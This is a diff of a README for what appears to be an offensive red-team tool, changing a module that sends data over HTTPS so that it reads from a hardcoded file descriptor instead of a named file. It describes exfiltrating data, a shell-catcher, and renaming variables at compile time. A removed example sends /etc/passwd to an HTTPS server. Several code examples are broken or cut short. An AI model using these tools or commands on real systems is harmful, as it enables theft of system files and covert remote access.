-Comms Without DNS
-=================
-Nearly the same as [`comms_over_https`](../comms_over_https) but can skip doing
-DNS resolution by passing the server's IP addres and port via an environment
-variable, `ALPT4ATS_REAL_ADDRESS`, by default.
+Read From File Descriptor
+=========================
+Nearly the same as [`comms_without_dns`](../comms_without_dns) but exfills data
+read from a file descriptor instead of from a named file.
 
+The file descriptor number is hardcoded to 8.
+
 A crude shell-catcher may be found in the
 [`letsencryptshellcatcher`](../letsencryptshellcatcher) directory.
 Run it with `-https /somepath`, and put the same `/somepath` in the server
 URL.
 
-File Descriptor
----------------
-The address and file as whitespace-separated words from file descriptor 7, and
-override the environment variables.  If only one word is read, it is taken to
-be the address.
+URL File Descriptor
+-------------------
+The URL may be read file descriptor 7, and overrides the environment variable.
 
 ### Examples
-Set the address and file via a heredoc:

 ```sh

-https://localhost:5555/somepath /etc/passwd
+./read_from_file_descriptor 7<<_eof

 _eof
 ```
 
 Set just the address via bash's Here String:
 ```sh
-./bin/comms_without_dns 7<<<"https://localhost:5555/somepath"

-`ALPT4ATS_FILE`         | File to send on the HTTPS connection
 `ALPT4ATS_REAL_ADDRESS` | Optional HTTPS Server IP:Port
 
 The variable names may be changed at compile-time, as below.

 `go build -ldflags '-X main.Foo=bar'`).  The variables are as follows
